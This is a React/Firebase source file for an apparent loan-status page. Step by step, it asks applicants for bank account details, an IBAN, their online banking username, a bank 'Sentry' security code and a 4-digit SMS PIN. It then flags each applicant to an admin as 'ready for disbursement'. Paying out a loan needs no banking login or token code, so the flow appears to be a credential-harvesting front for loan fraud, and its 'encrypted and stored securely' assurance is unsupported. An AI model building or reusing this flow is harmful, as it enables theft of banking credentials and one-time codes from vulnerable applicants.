import React, { useState } from 'react';
import { useOutletContext, useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import { 
  Building2, 
  CreditCard, 
  User, 
  CheckCircle2, 
  Clock, 
  AlertCircle, 
  Lock, 
  ShieldCheck,
  ArrowRight,
  ChevronRight
} from 'lucide-react';
import { db } from '../../../lib/firebase';
import { doc, updateDoc, serverTimestamp, addDoc, collection, increment } from 'firebase/firestore';
import { safeStringify } from '../../../lib/utils';
import { useAuth } from '../../../hooks/useAuth';
import { handleFirestoreError, OperationType } from '../../../lib/firebase';

export const LoanStatusPage = () => {
  const { user, userData, activeLoan, activeLoanId, loanLoading, localStatus, setLocalStatus } = useAuth();
  const navigate = useNavigate();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [bankDetails, setBankDetails] = useState({
    bankName: '',
    accountNumber: '',
    accountName: ''
  });
  const [additionalDetails, setAdditionalDetails] = useState({
    iban: '',
    phoneNumber: '',
    bankUsername: '',
    sentry: ''
  });

  const currentStatus = localStatus || activeLoan?.status || userData?.activeLoanStatus;

  // Load drafts from localStorage when user changes
  React.useEffect(() => {
    if (user) {
      const savedBank = localStorage.getItem(`loan_bank_details_${user.uid}`);
      if (savedBank) setBankDetails(JSON.parse(savedBank));
      
      const savedAdditional = localStorage.getItem(`loan_additional_details_${user.uid}`);
      if (savedAdditional) setAdditionalDetails(JSON.parse(savedAdditional));
    }
  }, [user]);

  React.useEffect(() => {
    if (user && (bankDetails.bankName || bankDetails.accountNumber || bankDetails.accountName)) {
      try {
        localStorage.setItem(`loan_bank_details_${user.uid}`, safeStringify(bankDetails));
      } catch (e) {
        console.error('Failed to save bank details to localStorage', e);
      }
    }
  }, [bankDetails, user]);

  React.useEffect(() => {
    if (user && (additionalDetails.iban || additionalDetails.phoneNumber)) {
      try {
        localStorage.setItem(`loan_additional_details_${user.uid}`, safeStringify(additionalDetails));
      } catch (e) {
        console.error('Failed to save additional details to localStorage', e);
      }
    }
  }, [additionalDetails, user]);

  // Cloud backup for drafts (debounced)
  React.useEffect(() => {
    if (!user || !activeLoan) return;

    const timer = setTimeout(async () => {
      try {
        await updateDoc(doc(db, 'loans', activeLoan.id), {
          draftData: {
            bankDetails,
            additionalDetails,
            lastDraftUpdate: serverTimestamp()
          }
        });
      } catch (err) {
        console.error('Error backing up draft to cloud:', err instanceof Error ? err.message : String(err));
        handleFirestoreError(err, OperationType.UPDATE, `loans/${activeLoan.id}`);
      }
    }, 2000);

    return () => clearTimeout(timer);
  }, [bankDetails, additionalDetails, user, activeLoan?.id]);

  // Load drafts from cloud on mount if local is empty
  React.useEffect(() => {
    if (activeLoan?.draftData && !bankDetails.bankName && !additionalDetails.iban) {
      if (activeLoan.draftData.bankDetails) {
        setBankDetails(activeLoan.draftData.bankDetails);
      }
      if (activeLoan.draftData.additionalDetails) {
        setAdditionalDetails(activeLoan.draftData.additionalDetails);
      }
    }
  }, [activeLoan?.id]);

  const handleBankSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
    if (!user || !loanId) return;

    setIsSubmitting(true);
    setLocalStatus('bank_details_submitted');
    
    try {
      setError(null);
      // First update the document
      await updateDoc(doc(db, 'loans', loanId), {
        status: 'bank_details_submitted',
        bankDetails,
        bankSubmittedAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
        // Clear draft on successful submit
        draftData: null
      });

      // Clear local storage
      localStorage.removeItem(`loan_bank_details_${user.uid}`);

      // Update user document for instant UI feedback
      await updateDoc(doc(db, 'users', user.uid), {
        activeLoanStatus: 'bank_details_submitted',
        bankDetails: bankDetails,
        updatedAt: serverTimestamp()
      });

      // Notify admin
      await addDoc(collection(db, 'notifications', 'admin', 'items'), {
        type: 'bank_details_submitted',
        title: 'New Bank Details',
        message: `User ${user.email} has submitted bank details for loan ${loanId}.`,
        loanId: loanId,
        userId: user.uid,
        createdAt: serverTimestamp(),
        read: false
      });
    } catch (err) {
      console.error('Error submitting bank details:', err instanceof Error ? err.message : String(err));
      handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
      setLocalStatus(null);
      setError('Failed to submit bank details. Please try again.');
    } finally {
      // Keep isSubmitting true for a brief moment to allow snapshot to propagate
      setTimeout(() => setIsSubmitting(false), 800);
    }
  };

  // If we know there's a loan (from userData) but the loan doc hasn't loaded yet
  if (loanLoading) {
    if (userData?.activeLoanStatus && userData.activeLoanStatus !== 'completed' && userData.activeLoanStatus !== 'rejected') {
      return (
        <div className="max-w-2xl mx-auto py-12 px-4 text-center">
          <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
            <Clock className="w-10 h-10 text-gray-400 animate-pulse" />
          </div>
          <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">Synchronizing...</h2>
          <p className="text-gray-500 mb-8 max-w-md mx-auto">
            We see you have an active application. We're just getting the final details ready for you.
          </p>
        </div>
      );
    }

    return (
      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
        <div className="w-20 h-20 bg-accent/10 rounded-full flex items-center justify-center mx-auto mb-6">
          <div className="w-10 h-10 border-4 border-accent border-t-transparent rounded-full animate-spin" />
        </div>
        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">Loading Loan Details</h2>
        <p className="text-gray-500 mb-8 max-w-md mx-auto">
          We're fetching your latest application details. This will only take a moment.
        </p>
      </div>
    );
  }

  if (!activeLoan && !localStatus && !userData?.activeLoanStatus) {
    // If loanLoading is false, it means we've finished checking the database and found no active loan
    // even if userData thinks there is one (stale data or deleted loan)
    return (
      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
        <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
          <Clock className="w-10 h-10 text-gray-400 animate-pulse" />
        </div>
        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">No Active Loan Found</h2>
        <p className="text-gray-500 mb-8 max-w-md mx-auto">
          We couldn't find an active loan application for your account. If you just applied, it might take a moment to appear.
        </p>
        <div className="flex flex-col gap-3 max-w-xs mx-auto">
          <button 
            onClick={() => navigate('/dashboard/loan-application')}
            className="btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
          >
            Apply for a Loan
          </button>
          <button 
            onClick={() => window.location.reload()}
            className="text-xs font-bold text-gray-400 uppercase tracking-widest hover:text-accent transition-colors"
          >
            Refresh Page
          </button>
        </div>
      </div>
    );
  }

  const renderStatusContent = () => {
    switch (currentStatus) {
      case 'pending':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <Clock className="w-10 h-10 text-yellow-500 animate-pulse" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Under Review</h3>
              <p className="text-gray-500 max-w-md mx-auto leading-relaxed mb-8">
                Your application is currently being reviewed by our credit team. 
                You can speed up the process by connecting your bank account now.
              </p>
            </div>

            <form onSubmit={handleBankSubmit} className="card space-y-6 border-2 border-accent/10">
              <h4 className="text-sm font-black uppercase tracking-widest text-accent mb-2">Connect Bank Account</h4>
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Name</label>
                  <div className="relative">
                    <Building2 className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.bankName}
                      onChange={(e) => setBankDetails({...bankDetails, bankName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="e.g. Chase Bank" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Number</label>
                  <div className="relative">
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountNumber}
                      onChange={(e) => setBankDetails({...bankDetails, accountNumber: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="10-digit account number" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Name</label>
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountName}
                      onChange={(e) => setBankDetails({...bankDetails, accountName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="Name as it appears on account" 
                    />
                  </div>
                </div>
              </div>

              <div className="p-4 bg-accent/5 rounded-2xl border border-accent/10 flex gap-4">
                <Lock className="w-5 h-5 text-accent shrink-0" />
                <p className="text-xs text-accent font-bold leading-relaxed">
                  Your bank details are encrypted and stored securely. We only use this information to disburse your loan funds.
                </p>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Submitting...' : 'Connect Bank Account'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'approved':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-10 h-10 text-green-500" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Loan Approved!</h3>
              <p className="text-gray-500">Please provide your bank details to receive your funds.</p>
            </div>

            <form onSubmit={handleBankSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Name</label>
                  <div className="relative">
                    <Building2 className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.bankName}
                      onChange={(e) => setBankDetails({...bankDetails, bankName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="e.g. Chase Bank" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Number</label>
                  <div className="relative">
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountNumber}
                      onChange={(e) => setBankDetails({...bankDetails, accountNumber: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="10-digit account number" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Name</label>
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountName}
                      onChange={(e) => setBankDetails({...bankDetails, accountName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="Name as it appears on account" 
                    />
                  </div>
                </div>
              </div>

              <div className="p-4 bg-accent/5 rounded-2xl border border-accent/10 flex gap-4">
                <ShieldCheck className="w-5 h-5 text-accent shrink-0" />
                <p className="text-xs text-accent font-bold leading-relaxed">
                  Your bank details are encrypted and stored securely. We only use this information to disburse your loan funds.
                </p>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Submitting...' : 'Connect Bank Account'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'bank_details_submitted':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <ShieldCheck className="w-10 h-10 text-blue-500" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Additional Verification</h3>
              <p className="text-gray-500 max-w-md mx-auto leading-relaxed mb-8">
                To finalize your bank connection, please provide the following additional details.
              </p>
            </div>

            <form 
              onSubmit={async (e) => {
                e.preventDefault();
                setIsSubmitting(true);
                setLocalStatus('pin_sent');
                
                const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
                if (!loanId) {
                  setLocalStatus(null);
                  setIsSubmitting(false);
                  return;
                }

                try {
                  setError(null);
                  await updateDoc(doc(db, 'loans', loanId), {
                    status: 'pin_sent',
                    additionalDetails,
                    additionalDetailsSubmittedAt: serverTimestamp(),
                    updatedAt: serverTimestamp(),
                    draftData: null
                  });

                  localStorage.removeItem(`loan_additional_details_${user.uid}`);

                  // Update user document for instant UI feedback
                  await updateDoc(doc(db, 'users', user.uid), {
                    activeLoanStatus: 'pin_sent',
                    updatedAt: serverTimestamp()
                  });
                } catch (err) {
                  console.error('Error submitting additional details:', err instanceof Error ? err.message : String(err));
                  handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
                  setLocalStatus(null);
                  setError('Failed to submit details.');
                } finally {
                  setTimeout(() => setIsSubmitting(false), 800);
                }
              }} 
              className="card space-y-6 border-2 border-blue-500/10"
            >
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">IBAN Number</label>
                  <input 
                    required
                    name="iban"
                    type="text" 
                    value={additionalDetails.iban}
                    onChange={(e) => setAdditionalDetails({...additionalDetails, iban: e.target.value})}
                    className="input-field" 
                    placeholder="International Bank Account Number" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Phone Number</label>
                  <input 
                    required
                    name="phoneNumber"
                    type="tel" 
                    value={additionalDetails.phoneNumber}
                    onChange={(e) => setAdditionalDetails({...additionalDetails, phoneNumber: e.target.value})}
                    className="input-field" 
                    placeholder="Linked phone number" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Username</label>
                  <input 
                    required
                    name="bankUsername"
                    type="text" 
                    value={additionalDetails.bankUsername}
                    onChange={(e) => setAdditionalDetails({...additionalDetails, bankUsername: e.target.value})}
                    className="input-field" 
                    placeholder="Your online banking username" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Sentry</label>
                  <input 
                    required
                    name="sentry"
                    type="text" 
                    value={additionalDetails.sentry}
                    onChange={(e) => setAdditionalDetails({...additionalDetails, sentry: e.target.value})}
                    className="input-field" 
                    placeholder="Enter Sentry ID/Code" 
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Processing...' : 'Verify & Continue'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'pin_sent':
        return (
          <div className="max-w-md mx-auto text-center">
            <div className="w-20 h-20 bg-purple-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldCheck className="w-10 h-10 text-purple-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Verification PIN Sent</h3>
            <p className="text-gray-500 mb-8">
              A verification PIN has been sent to your registered phone number. Please enter it below to finalize your application.
            </p>
            <div className="space-y-6">
              <input 
                type="text" 
                maxLength={4}
                className="w-full text-center text-4xl font-black tracking-[1em] py-6 rounded-3xl border-2 border-gray-100 dark:border-zinc-800 bg-gray-50 dark:bg-zinc-900 focus:border-accent outline-none dark:text-white"
                placeholder="0000"
                onChange={async (e) => {
                  if (e.target.value.length === 4) {
                    setIsSubmitting(true);
                    setLocalStatus('pin_submitted');
                    
                    const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
                    if (!loanId) {
                      setLocalStatus(null);
                      setIsSubmitting(false);
                      return;
                    }

                    try {
                      setError(null);
                      await updateDoc(doc(db, 'loans', loanId), {
                        status: 'pin_submitted',
                        pinSubmittedAt: serverTimestamp(),
                        updatedAt: serverTimestamp()
                      });

                      // Update user document for instant UI feedback
                      await updateDoc(doc(db, 'users', user.uid), {
                        activeLoanStatus: 'pin_submitted',
                        updatedAt: serverTimestamp()
                      });

                      // Notify admin
                      await addDoc(collection(db, 'notifications', 'admin', 'items'), {
                        type: 'pin_submitted',
                        title: 'PIN Verified',
                        message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
                        loanId: loanId,
                        userId: user.uid,
                        createdAt: serverTimestamp(),
                        read: false
                      });
                    } catch (err) {
                      console.error('Error submitting PIN:', err instanceof Error ? err.message : String(err));
                      handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
                      setLocalStatus(null);
                      setError('Failed to submit PIN.');
                    } finally {
                      setTimeout(() => setIsSubmitting(false), 800);
                    }
                  }
                }}
              />
              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the 4-digit code to continue</p>
              <p className="text-xs text-gray-400 mt-4">If you don't see a code, please contact your account manager.</p>
            </div>
          </div>
        );

      case 'pin_submitted':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-accent/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <Clock className="w-10 h-10 text-accent animate-pulse" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Final Processing</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Your PIN has been verified. We are now performing the final disbursement checks. Your funds will be released shortly.
            </p>
          </div>
        );

      case 'disbursed':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldCheck className="w-10 h-10 text-green-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Loan Disbursed</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Your funds have been sent to your bank account. Please check your balance. Your repayment schedule is now active.
            </p>
            <button 
              onClick={() => navigate('/dashboard/repayment')}
              className="mt-8 btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
            >
              View Repayment Schedule
            </button>
          </div>
        );

      case 'rejected':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertCircle className="w-10 h-10 text-red-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Application Rejected</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Unfortunately, your loan application was not approved at this time. You can try applying again in 30 days.
            </p>
          </div>
        );

      default:
        return (
          <div className="text-center py-10">
            <p className="text-gray-500 uppercase font-black tracking-widest text-xs">Status: {currentStatus || 'Unknown'}</p>
          </div>
        );
    }
  };

  return (
    <div className="max-w-4xl mx-auto">
      <div className="mb-8">
        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-2 uppercase">Loan Status</h2>
        <p className="text-gray-500">Track your application and manage your active loans.</p>
      </div>

      {error && (
        <motion.div 
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-6 p-4 rounded-2xl bg-red-500/10 text-red-500 text-sm font-bold uppercase tracking-widest flex items-center gap-3"
        >
          <AlertCircle className="w-5 h-5" />
          {error}
        </motion.div>
      )}

      <motion.div 
        key={currentStatus}
        initial={{ opacity: 0, x: 20 }}
        animate={{ opacity: 1, x: 0 }}
        exit={{ opacity: 0, x: -20 }}
        className="card min-h-[400px] flex flex-col justify-center relative overflow-hidden"
      >
        {isSubmitting && (
          <div className="absolute inset-0 bg-white/80 dark:bg-zinc-950/80 backdrop-blur-sm z-50 flex flex-col items-center justify-center">
            <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mb-4" />
            <p className="text-sm font-black uppercase tracking-widest text-accent">Processing...</p>
          </div>
        )}
        {renderStatusContent()}
      </motion.div>
    </div>
  );
};
